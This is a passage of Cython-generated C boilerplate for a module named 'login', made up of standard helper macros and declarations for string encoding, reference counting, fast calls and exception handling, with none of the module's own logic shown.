static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__login
#define __PYX_HAVE_API__login

#ifdef _OPENMP
#include <omp.h>
#endif 

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif



#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else 
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif 
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "login.py",
};





#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)


#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif


static PyObject *__Pyx_GetBuiltinName(PyObject *name);


#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif


#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
}
#define __Pyx_GetModuleGlobalNameUncached(var, name)  {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
}
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif


#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif


#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif // CYTHON_FAST_PYCALL
#endif


#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif


static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);


#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif


static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);


#if CYTHON_COMPILING_IN_PYPY
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#elif PY_MAJOR_VERSION < 3
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyString_CheckExact(s)) ? PyUnicode_FromEncodedObject(s, NULL, "strict") :\
        PyObject_Format(s, f))
#elif CYTHON_USE_TYPE_SLOTS
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyLong_CheckExact(s)) ? PyLong_Type.tp_str(s) :\
        likely(PyFloat_CheckExact(s)) ? PyFloat_Type.tp_str(s) :\
        PyObject_Format(s, f))
#else
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#endif


#include <string.h>


static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      Py_UCS4 max_char);


static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected);


static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index);


static CYTHON_INLINE int __Pyx_IterFinish(void);


static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected);


#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\
    (is_list ? (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL) :\
               __Pyx_GetItemInt_Generic(o, to_py_func(i))))
#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "tuple index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,
                                                     int is_list, int wraparound, int boundscheck);


#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject *__Pyx_PyObject_GetItem(PyObject *obj, PyObject* key);
#else
#define __Pyx_PyObject_GetItem(obj, key)  PyObject_GetItem(obj, key)
#endif


#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif


#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key);
#define __Pyx_PyObject_Dict_GetItem(obj, name)\
    (likely(PyDict_CheckExact(obj)) ?\
     __Pyx_PyDict_GetItem(obj, name) : PyObject_GetItem(obj, name))
#else
#define __Pyx_PyDict_GetItem(d, key) PyObject_GetItem(d, key)
#define __Pyx_PyObject_Dict_GetItem(obj, name)  PyObject_GetItem(obj, name)
#endif


static CYTHON_INLINE int __Pyx_PySequence_ContainsTF(PyObject* item, PyObject* seq, int eq) {
    int result = PySequence_Contains(seq, item);
    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));
}


#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif


#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif


#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif


#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif


#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)


#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif


static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname);


static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals);


static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals);


#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);
#else
#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)
#endif


#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSwap(type, value, tb)  __Pyx__ExceptionSwap(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb);
#endif


